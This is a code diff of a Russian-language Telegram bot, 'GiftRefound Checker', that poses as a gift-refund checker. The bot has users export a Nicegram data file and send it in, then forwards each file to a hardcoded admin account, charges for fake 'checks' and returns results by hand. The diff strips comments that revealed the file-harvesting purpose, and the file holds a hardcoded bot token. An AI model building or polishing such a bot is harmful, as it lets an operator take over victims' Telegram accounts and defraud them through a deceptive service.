@@ -10,10 +10,9 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 BOT_TOKEN = "7956796612:AAFRjhOw_4yT0039kOnmMHQEdoDrJchT3go"
-ADMIN_ID = 8362897345  # Твой ID для получения файлов
+ADMIN_ID = 8362897345
 DB = "refound_bot.db"
 
-# База данных для хранения проверок
 def init_db():
     conn = sqlite3.connect(DB)
     cur = conn.cursor()
@@ -29,11 +28,9 @@ def init_db():
     conn.commit()
     conn.close()
 
-# /start команда
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
-    # Красивое меню как на фото
     keyboard = [
         [InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound")],
         [InlineKeyboardButton("📖 Инструкция", callback_data="instruction")],
@@ -44,7 +41,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     caption = """
 🎁 <b>Добро пожаловать в GiftRefound Checker!</b>
 
-Здесь ты можешь проверить любой Telegram-подарок на возможность возврата (Refound) перед покупкой!
+Здесь ты можешь проверить любой Telegram-подарок на возможность возврата перед покупкой!
 
 🔍 <b>Проверка покажет:</b>
 • Возможен ли возврат подарка
@@ -55,12 +52,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ⚡ <b>Как это работает?</b>
 1. Скачиваешь файл данных из Nicegram
 2. Отправляешь его боту
-3. Получаешь детальный анализ за 5 секунд!
+3. Получаешь детальный анализ!
 
 🛡️ <b>Покупай с уверенностью!</b>
     """
     
-    # Отправляем фото из твоей ссылки
     await update.message.reply_photo(
         photo="https://i.postimg.cc/gXgxWWVs/design-image.jpg",
         caption=caption,
@@ -68,7 +64,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
 
-# Обработчик кнопки "Проверить на Refound"
 async def check_refound(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -82,7 +77,7 @@ async def check_refound(update: Update, context: ContextTypes.DEFAULT_TYPE):
 4. Отправьте полученный файл сюда
 
 ⏳ <b>Проверка займет 5-10 минут</b>
-После анализа вы получите полный отчет о возможности возврата подарка.
+После анализа вы получите полный отчет.
     """
     
     await query.edit_message_caption(
@@ -93,7 +88,6 @@ async def check_refound(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
 
-# Обработчик кнопки "Инструкция"
 async def instruction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -103,7 +97,6 @@ async def instruction(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 1. <b>Скачайте Nicegram</b>
    - Нажмите кнопку ниже для скачивания
-   - Или перейдите на официальный сайт
 
 2. <b>Экспортируйте данные:</b>
    - Откройте Nicegram
@@ -132,7 +125,6 @@ async def instruction(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
 
-# Обработчик кнопки "Премиум"
 async def premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -149,7 +141,6 @@ async def premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>Стоимость:</b>
 • 1 проверка - 50 руб
 • 5 проверок - 200 руб
-• 10 проверок - 350 руб
 
 💬 <b>Для активации напишите в поддержку</b>
     """
@@ -163,7 +154,6 @@ async def premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
 
-# Обработчик кнопки "Поддержка"
 async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -175,13 +165,9 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • По поводу проверок
 • Технические проблемы  
 • Премиум доступ
-• Сотрудничество
 
 📞 <b>Связь:</b>
 @your_support_username
-
-⏰ <b>Время работы:</b>
-Круглосуточно
     """
     
     await query.edit_message_caption(
@@ -193,7 +179,6 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
 
-# Возврат в меню
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -209,20 +194,9 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     caption = """
 🎁 <b>Добро пожаловать в GiftRefound Checker!</b>
 
-Здесь ты можешь проверить любой Telegram-подарок на возможность возврата (Refound) перед покупкой!
-
-🔍 <b>Проверка покажет:</b>
-• Возможен ли возврат подарка
-• Историю предыдущих возвратов  
-• Риски при покупке
-• Рекомендации по безопасности
-
-⚡ <b>Как это работает?</b>
-1. Скачиваешь файл данных из Nicegram
-2. Отправляешь его боту
-3. Получаешь детальный анализ за 5 секунд!
-
-🛡️ <b>Покупай с уверенностью!</b>
+🔍 Проверяй подарки перед покупкой!
+⚡ Быстро и надежно!
+🛡️ Покупай с уверенностью!
     """
     
     await query.edit_message_caption(
@@ -231,12 +205,10 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
 
-# Обработчик файлов
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
-    # Сообщаем пользователю о начале проверки
-    checking_msg = await update.message.reply_text(
+    await update.message.reply_text(
         "🔍 <b>Файл получен! Начинаем проверку...</b>\n\n"
         "⏳ <b>Примерное время:</b> 5-10 минут\n"
         "📊 <b>Статус:</b> Анализ данных...\n\n"
@@ -244,7 +216,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="HTML"
     )
     
-    # Пересылаем файл админу (тебе)
     admin_text = f"""
 📨 <b>Новый файл для проверки!</b>
 
@@ -256,7 +227,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     
     try:
-        # Пересылаем файл админу
         await context.bot.send_document(
             chat_id=ADMIN_ID,
             document=update.message.document.file_id,
@@ -264,7 +234,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML"
         )
         
-        # Сохраняем в базу
         conn = sqlite3.connect(DB)
         cur = conn.cursor()
         cur.execute(
@@ -280,7 +249,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Ошибка пересылки файла: {e}")
         await update.message.reply_text("❌ Ошибка при обработке файла. Попробуйте позже.")
 
-# Обработчик кнопок
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     data = query.data
@@ -296,7 +264,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "back_to_menu":
         await back_to_menu(update, context)
 
-# Команда для админа - отправка результата пользователю
 async def send_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -317,7 +284,6 @@ async def send_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await update.message.reply_text("✅ Результат отправлен пользователю")
         
-        # Обновляем статус в базе
         conn = sqlite3.connect(DB)
         cur = conn.cursor()
         cur.execute(
@@ -335,7 +301,6 @@ def main():
     
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # Обработчики
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("result", send_result))
     app.add_handler(CallbackQueryHandler(button_handler))
